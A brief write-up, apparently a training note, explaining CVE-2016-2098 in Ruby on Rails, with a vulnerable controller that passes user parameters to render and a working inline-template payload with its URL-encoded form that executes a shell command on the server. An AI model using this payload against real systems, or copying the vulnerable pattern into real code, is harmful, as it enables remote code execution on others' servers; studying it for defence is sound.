# CVE-2016-2098 / Rails RCE

This vulnerability is caused by calling the method `render` on user-supplied data. This issue can be used to gain code execution.

### Issue

The following code illustrates the problem:

```ruby
class TestController < ApplicationController
  def show
    render params[:id]
  end
end
```

The method `render` is usually used to render a page from a template like in the following code:

```ruby
class TestController < ApplicationController
  def show
    render 'show'
  end
```

The `render` method also allows developers to render plain text (`plaintext`) and even inline code (`inline`).

### Exploit

Instead of sending a simple parameter `id=test`, you can build your request to send a hash: `id[inline]=RUBYTEMPLATE`. To gain code execution, you just need to find the right value for `RUBYTEMPLATE` to exec commands. Here you will need to be extra careful with the encoding to get it to work.

we get parameter `?id=test`

replace it with ``id[inline]=<%= `id` %>``

type it in url encoding `id[inline]=<%25%3D%60id%60%25>`